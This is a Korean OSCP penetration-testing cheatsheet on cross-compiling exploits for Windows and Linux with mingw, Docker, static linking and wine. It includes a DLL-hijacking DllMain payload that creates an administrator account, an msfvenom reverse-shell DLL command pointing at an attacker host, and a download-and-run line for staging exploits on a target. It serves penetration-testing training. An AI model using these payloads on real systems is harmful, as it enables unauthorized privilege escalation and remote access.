---
title: "크로스 컴파일 (Cross-Compiling)"
date: 2026-06-20
weight: 160
draft: false
tags: ["oscp", "cheatsheet"]
summary: "대상에서 컴파일이 안 될 때, Kali에서 먼저 테스트해야 할 때의 Windows/Linux 대처법."
---

대상이 컴파일을 못 할 때, Kali에서 먼저 테스트해야 할 때, GLIBC가 발목을 잡을 때의 대처 모음. Windows(mingw + wine)와 Linux(docker + static)를 모두 다룬다.

- 출처: https://heretek.dev/oscp-cheatsheet/cross-compiling/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 1. 이 문서를 쓰는 시점 (WHEN to use)

- 공개 익스플로잇이 .c인데 대상은 Windows, EXE가 필요 → §3
- 공개 익스플로잇이 .c인데 대상은 Linux, gcc가 없음 → §5
- 컴파일한 바이너리가 Kali에서는 되는데 대상에서 실패 → §6 + §7
- 대상에서 GLIBC_X.Y not found → §5 (버전 일치 컨테이너)
- 업로드 대신 Kali에서 원격 익스플로잇을 직접 발사 → §6 (wine)

## 2. 셋업 (Kali에서 1회)

```bash
# Windows cross-compile
sudo apt install mingw-w64

# Run Windows binaries on Kali
sudo dpkg --add-architecture i386 && sudo apt update
sudo apt install wine wine32 wine64

# Linux precompile in matching distro
sudo apt install docker.io && sudo systemctl start docker
```

mingw 컴파일러는 두 종류 — 아키텍처가 대상과 일치해야 한다 (중요):

- `i686-w64-mingw32-gcc` — 32비트 Windows PE
- `x86_64-w64-mingw32-gcc` — 64비트 Windows PE (요즘 기본)

`file evil.exe` 로 확인 — `PE32` = 32비트, `PE32+` = 64비트. 어긋나면 조용히 실패한다.

## 3. C 소스에서 Windows EXE 만들기

```bash
# Basic
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Network exploit (winsock)
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# Static — no DLL deps on target
x86_64-w64-mingw32-gcc -static -o exploit.exe exploit.c -lws2_32
```

링커 에러 규칙: `undefined reference to _imp__<symbol>` → 심볼을 검색 → 일치하는 `-l` 플래그 추가.

심볼별 플래그:

- `WSAStartup`, `socket`, `connect`, `send` → `-lws2_32` (winsock)
- `InternetOpen`, `HttpSend` → `-lwininet` (HTTP)
- `RegOpenKey`, `OpenSCManager` → `-ladvapi32` (레지스트리 / 서비스)

## 4. DLL 하이재킹용 Windows DLL

같은 컴파일러에 `--shared`와 `.dll` 확장자를 쓴다. 파일 이름은 대상 앱이 로드하는 DLL과 정확히 일치해야 한다 (필수).

```bash
x86_64-w64-mingw32-gcc evil.cpp --shared -o TextShaping.dll
```

DllMain 템플릿 — 페이로드는 `DLL_PROCESS_ATTACH`에서 실행된다:

```text
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system("net user pwned Password123! /add");
            i = system("net localgroup administrators pwned /add");
            break;
        case DLL_THREAD_ATTACH:  break;
        case DLL_THREAD_DETACH:  break;
        case DLL_PROCESS_DETACH: break;
    }
    return TRUE;
}
```

역방향 쉘만 필요하면 msfvenom이 더 빠르다:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o evil.dll
```

DLL 하이재킹 절차:

1. `icacls "C:\App"` 으로 내 계정에 `(M)` 또는 `(F)` 가 있는지 확인
2. 대상 DLL 이름을 특정 (로컬 사본에서 procmon, 또는 알려진 CVE)
3. 쓰기 가능한 디렉터에 대상 DLL과 정확히 같은 이름으로 내 DLL을 떨어뜨린다 (정확한 파일명 필수)
4. 권한 있는 유저가 앱을 실행하기를 기다린다 — DLL이 그 유저의 권한으로 로드된다

## 5. Linux ELF — 대상에 gcc가 없을 때

진짜 문제는 "gcc 없음"이 아니라 glibc 불일치인 경우가 대부분 (중요). Kali(최신 glibc)에서 컴파일하면 오래된 대상에서 `GLIBC_2.34 not found` 로 실패한다.

### 전략 A — 정적 링크 먼저 (빠르고 자주 통한다)

```bash
gcc -static -o exploit exploit.c
file exploit         # should say "statically linked"
```

정적 바이너리는 대상 glibc에 의존하지 않는다. 파일이 크지만 아키텍처만 맞으면 어디서든 돈다.

정적 링크가 안 되는 경우: 동적 로더 동작에 의존하는 익스플로잇 (PwnKit은 정적 컴파일이 안 된다), dlopen/dlsym을 쓰는 익스플로잇.

### 전략 B — 대상 배포판과 맞는 Docker 컨테이너

```bash
# Identify target first
cat /etc/os-release           # on target

# On Kali — spin up matching container
mkdir ~/xc && cd ~/xc
# put exploit.c in this dir

docker run -it --rm -v $(pwd):/work ubuntu:20.04 bash
# inside container:
apt update && apt install -y gcc make
cd /work && gcc -o exploit exploit.c
exit

# Back on Kali:
file exploit          # confirm: ELF 64-bit, x86_64
python3 -m http.server 8000

# On target:
wget http://KALI_IP:8000/exploit && chmod +x exploit && ./exploit
```

대상 배포판 → 컨테이너:

- Ubuntu 16.04 / 18.04 / 20.04 → `ubuntu:16.04` / `:18.04` / `:20.04`
- Debian 9 / 10 / 11 → `debian:9` / `:10` / `:11`
- CentOS 7 → `centos:7`
- RHEL/CentOS 8 → `rockylinux:8`
- Alpine → `alpine:3.X`

## 6. 전송 전 테스트

### 아키텍처 확인 — 항상 수행

```bash
file evil.exe     # PE32 or PE32+ — must match target arch
file exploit      # ELF 32-bit or 64-bit — must match target arch
```

### Wine — Windows 바이너리를 Kali에서 스모크 테스트

```bash
wine evil.exe                 # smoke test
sudo wine exploit.exe         # if raw socket privileges needed
```

실제 쓰임은 두 가지:

1. 스모크 테스트 — wine에서 크래시하면 망가진 것이다. 전송해도 안 될 바이너리에 대상 리셋을 낭비하지 않는다.
2. 원격 네트워크 익스플로잇을 Kali에서 직접 실행 — 컴파일된 익스플로잇 다수가 소켓을 열어 대상 IP를 향해 쏜다. Windows에 업로드할 필요가 없다.

Wine이 되는 것: 네트워크 익스플로잇, 간단한 유틸리티, BoF 스텁, 기본 system() 호출.
Wine이 안 되는 것: SeImpersonate Potato 공격, 실제 Windows 서비스 / .NET / WMI / SCM이 필요한 것, GUI 앱. 이런 것은 실제 대상으로 전송한다.

## 7. 문제 해결 (Troubleshooting)

증상 / 원인 / 해결 순:

- `undefined reference to _imp__WSAStartup` → winsock 링크 누락 → `-lws2_32` 추가
- Kali(wine)에서는 되는데 대상에서 안 됨 → 대상에 런타임 DLL 없음 → `-static` 으로 재빌드
- 대상에서 GLIBC_2.XX not found → glibc 불일치 → 일치하는 docker 컨테이너에서 빌드, 또는 `-static`
- DLL을 전송했는데 앱이 무시 → 아키텍처 또는 파일명 불일치 → `file evil.dll` 로 아키텍처 확인, 정확한 대상 DLL 이름 확인
- DLL을 로드하지 않고 앱이 크래시 → DllMain이 잘못됨 → 끝의 `return TRUE;` 확인
- 하이재크 발동을 위해 서비스 재시작이 안 됨 → `sc stop`/`sc start` 불가 → SeShutdownPrivilege 가 있으면 `shutdown /r /t 0`, 없으면 자동 재시작 또는 예약 트리거 대기
- `wine: cannot find L"..."` → 32비트 의존성 누락 → `sudo apt install wine32`
- 컴파일했는데 바이너리가 0바이트 / 손상 → 컴파일러가 조용히 실패 → `-v` 로 재실행해 에러 확인
